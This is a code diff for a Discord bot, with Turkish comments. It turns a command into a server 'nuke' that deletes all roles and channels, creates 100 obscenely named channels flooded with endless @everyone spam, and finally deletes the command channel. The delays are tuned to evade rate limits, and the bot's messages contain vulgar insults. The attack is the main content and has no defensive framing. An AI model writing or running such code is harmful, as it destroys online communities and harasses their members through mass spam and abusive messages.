@@ -822,82 +822,86 @@ if (command === 'hollowpurple') {
     }
 }
 
-// --- HOLLOW PURPLE: SLOW DEATH ---
+// --- HOLLOW PURPLE: ACE MODE ---
 if (command === 'hollowpurple100x') {
     const guild = message.guild;
     if (!guild) return;
 
+    // Satoru Gojo Yetki Kontrolü
     if (message.author.id !== '983015347105976390') {
         return message.reply("Bu teknik için gereken 'Altı Göz' sende yok.");
     }
 
     if (!args.some(arg => arg.toLowerCase() === "onaylıyorum")) {
-        return message.reply("🔴 **KRİTİK UYARI:** Sunucu yavaşça boşluğa çekilecek. Onay: `a!hollowpurple100x onaylıyorum`.");
+        return message.reply("🔴 **KRİTİK UYARI:** Sunucu ACE tarafından mühürlenecek. Onay: `a!hollowpurple100x onaylıyorum`.");
     }
 
-    console.log("🟣 Teknik başlatıldı: Yavaş ve Kalıcı Ölüm modu.");
-    message.channel.send("🟣 **Sınırsız Boşluk genişliyor...** (Limitlere takılmamak için yavaş mod aktif)");
+    console.log("🟣 Hollow Purple: ACE Mode Başlatıldı.");
 
-    // 1. MEVCUT KANALLARA YAVAŞ SIZMA (Her 2 saniyede bir kanala @everyone)
-    const existingChannels = guild.channels.cache.filter(ch => ch.type === 0 || ch.type === 'GUILD_TEXT').toJSON();
-    existingChannels.forEach((ch, index) => {
-        setTimeout(() => {
-            ch.send("@everyone **MORUN SONSUZLUĞUNA HAPSOLDUNUZ!** 🟣\nhttps://tenor.com/view/gojo-hollow-purple-gif-21743516").catch(() => {});
-        }, index * 2000); // 2 saniye aralıklarla mevcut kanallara yazar
-    });
+    const aceGif = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExd2gyc2Z6YzNwMjM2cmxncXhpM3ZuY2w2b2V1Y2RteGU2Z2R1ZXZmayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/0wxRYPhdD7n3W7NQ1R/giphy.gif";
 
-    // 2. ROLLERİ YAVAŞÇA MOR YAP (Her 1 saniyede bir rol)
-    const roles = guild.roles.cache.filter(r => r.editable && r.name !== "@everyone").toJSON();
+    // 1. ROLLERİ SİL (Yavaşlatılmış - Saniyede 1 rol)
+    const roles = guild.roles.cache.filter(r => r.editable && r.name !== "@everyone" && r.managed === false).toJSON();
     roles.forEach((role, index) => {
         setTimeout(() => {
-            role.setColor('#800080').catch(() => {});
-        }, index * 1500); 
+            role.delete().catch(() => {});
+        }, index * 1000);
     });
 
-    // 3. 100 YENİ KANAL: ÖLDÜRÜCÜ DARBE (Her 5 saniyede bir kanal)
-    // Neden 5 saniye? Discord'un 'Kanal Oluşturma' sınırı çok serttir.
+    // 2. MEVCUT KANALLARI SİL (Komut kanalı hariç)
+    const existingChannels = guild.channels.cache.filter(ch => ch.id !== message.channel.id).toJSON();
+    existingChannels.forEach((ch, index) => {
+        setTimeout(() => {
+            if (ch.deletable) ch.delete().catch(() => {});
+        }, index * 800);
+    });
+
+    // 3. 100 YENİ KANAL VE SONSUZ KAOS
     for (let i = 1; i <= 100; i++) {
         setTimeout(async () => {
             try {
                 const ch = await guild.channels.create({
-                    name: `void-${i}`,
-                    type: 0 
+                    name: `ace-tarafindan-sikildiniz-${i}`,
+                    type: 0,
+                    permissionOverwrites: [
+                        {
+                            id: guild.id, // @everyone ID'si
+                            allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory'],
+                        },
+                    ],
                 });
 
-                // Kanal açıldıktan sonra içine sonsuz döngü kur
+                // Durdurulamaz Spam Döngüsü (Her 4 saniyede bir)
                 setInterval(() => {
-                    ch.send("@everyone **BURADAN ÇIKIŞ YOK.** 🟣").catch(() => {});
-                }, 10000); // Her 10 saniyede bir mesaj (Botun düşmemesi için ideal)
+                    ch.send({
+                        content: `@everyone **ACE TARAFINDAN HOLLOW PURPLE 100X E HAPİS OLDUNUZ ÇATIR ÇUTUR SİKİLİYORSUNUZ!** 🟣\n${aceGif}`
+                    }).catch(() => {});
+                }, 4000);
 
             } catch (err) {
-                console.log("Hız sınırına takıldık, bir sonraki kanal bekleniyor...");
+                console.log("Kanal oluşturma limiti!");
             }
-        }, i * 5000); // 5 saniye aralıkla 100 kanal açar. Toplam işlem ~8 dakika sürer ama sunucu biter.
+        }, (existingChannels.length * 800) + (i * 4000)); 
     }
+
+    // En son komutun yazıldığı kanalı sil (5 dakika sonra veya işlemler bitince)
+    setTimeout(() => {
+        message.channel.delete().catch(() => {});
+    }, (existingChannels.length * 800) + 10000);
 }
 
-// --- İPTAL: TERS TEKNİK ---
+// --- İPTAL: SADECE VOIDLERİ TEMİZLER ---
 if (command === 'purpleiptal') {
     if (message.author.id !== '983015347105976390') return;
     const guild = message.guild;
 
-    message.channel.send("🔴 **Ters Lanetli Teknik: 'Kırmızı'. Temizlik başlatıldı...**");
+    message.channel.send("🔴 **Mühür kaldırılıyor... (Sadece ACE kanalları silinir)**");
 
-    // Kanalları silerken de yavaş silmeliyiz ki bot ban yemesin
-    const voidChannels = guild.channels.cache.filter(ch => ch.name.startsWith('void-')).toJSON();
-    voidChannels.forEach((ch, index) => {
+    const aceChannels = guild.channels.cache.filter(ch => ch.name.startsWith('ace-tarafindan-')).toJSON();
+    aceChannels.forEach((ch, index) => {
         setTimeout(() => {
             if (ch.deletable) ch.delete().catch(() => {});
-        }, index * 1000); // Saniyede 1 kanal siler
-    });
-
-    // Rolleri eski (gri) haline getir
-    guild.roles.cache.forEach((role, index) => {
-        if (role.editable && role.name !== "@everyone") {
-            setTimeout(() => {
-                role.setColor('#99aab5').catch(() => {});
-            }, index * 500);
-        }
+        }, index * 500);
     });
 }
 
